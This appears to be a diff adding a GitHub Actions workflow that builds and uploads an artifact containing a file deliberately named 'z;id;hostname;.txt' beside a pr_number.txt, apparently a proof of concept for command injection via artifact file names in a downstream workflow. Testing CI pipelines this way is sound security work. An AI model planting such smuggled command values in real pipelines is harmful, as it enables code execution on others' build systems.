@@ -1,0 +1,19 @@
+name: Tests
+
+on:
+  workflow_dispatch:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: make artifact
+        run: |
+          mkdir -p out
+          printf '1' > out/pr_number.txt
+          printf 'attacker content\n' > 'out/z;id;hostname;.txt'
+          ls -la out
+      - uses: actions/upload-artifact@v4
+        with:
+          name: content
+          path: out/
